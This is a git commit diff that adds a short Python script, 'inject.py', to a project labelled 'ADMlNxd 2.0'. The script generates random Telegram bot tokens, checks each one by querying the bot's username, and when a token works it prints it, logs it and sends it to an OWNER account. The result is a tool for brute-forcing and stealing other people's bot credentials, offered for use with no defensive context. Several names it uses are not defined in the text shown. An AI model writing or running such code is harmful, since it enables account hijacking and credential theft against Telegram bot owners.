76ebcffa2e7480cc6b45c4081deb7783e363c037
Himanshu kumar <83366556+I-Himanshu@users.noreply.github.com>
2021-09-28 00:05:56 +0530

    update inject.py

--- inject.py
+++ inject.py
@@ -1,3 +1,12 @@
 #ADMlNxd 2.0
-print("hii")
-print("1")
+token = "609517172:AA" + "".join(random.choices(chars,k=33))
+new_bot = Bot(token)
+try:
+  username = new_bot.username
+  if username:
+    print(token)
+    LOGGING(username)
+    new_bot.send_message(OWNER, token)
+    LOGGING("Har Har Mahadev 🚩")
+except:
+  pass
